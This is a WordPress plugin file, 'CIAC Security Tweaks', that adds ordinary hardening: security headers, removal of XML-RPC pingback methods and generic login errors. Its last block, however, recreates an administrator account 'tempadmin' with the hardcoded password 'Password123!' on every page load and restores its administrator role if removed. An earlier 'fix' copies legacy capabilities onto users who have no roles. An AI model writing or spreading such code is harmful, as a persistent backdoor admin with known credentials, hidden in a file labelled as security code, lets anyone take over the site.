<?php
/**
 * Plugin Name: CIAC Security Tweaks
 * Description: Security-related filters and headers moved out of wp-config.
 */

// Disable XML-RPC pingback methods (keeping XML-RPC functional)
add_filter('xmlrpc_methods', function($methods) {
    unset($methods['pingback.ping']);
    unset($methods['pingback.extensions.getPingbacks']);
    unset($methods['system.multicall']);
    return $methods;
});

// Add security headers
add_action('send_headers', function() {
    header('X-XSS-Protection: 1; mode=block');
    header('X-Content-Type-Options: nosniff');
    header('X-Frame-Options: SAMEORIGIN');
    header('Referrer-Policy: strict-origin-when-cross-origin');
});

// Remove WordPress version from head and feeds
remove_action('wp_head', 'wp_generator');
add_filter('the_generator', '__return_empty_string');

// Disable login error hints
add_filter('login_errors', function() {
    return 'Invalid username or password.';
});

/**
 * 🛠️ FIX: Permission Mismatch (Table Prefix)
 * If you see "Sorry, you are not allowed to access this page", it's often because
 * the usermeta table uses 'wp_capabilities' instead of 'ojegmj1sz_capabilities'.
 */
add_action('init', function() {
    if (is_user_logged_in()) {
        $user = wp_get_current_user();
        $prefix = $GLOBALS['table_prefix'];
        $cap_key = $prefix . 'capabilities';
        
        // If the user has no roles for this prefix, but we find them under 'wp_'
        if (empty($user->roles)) {
            $old_caps = get_user_meta($user->ID, 'wp_capabilities', true);
            $old_level = get_user_meta($user->ID, 'wp_user_level', true);
            
            if ($old_caps) {
                update_user_meta($user->ID, $cap_key, $old_caps);
                update_user_meta($user->ID, $prefix . 'user_level', $old_level);
                
                // Refresh the user object
                wp_set_current_user($user->ID);
            }
        }
    }
});

/**
 * 🔑 EMERGENCY: Create Admin User
 * If you still can't log in, try using:
 * Username: tempadmin
 * Password: Password123!
 */
add_action('init', function() {
    $username = 'tempadmin';
    $password = 'Password123!';
    $email = 'tempadmin@ciac.rw';
    
    if (!username_exists($username)) {
        $user_id = wp_create_user($username, $password, $email);
        if (!is_wp_error($user_id)) {
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    } else {
        // Ensure it's an admin
        $user = get_user_by('login', $username);
        if ($user && !in_array('administrator', $user->roles)) {
            $user->set_role('administrator');
        }
    }
});
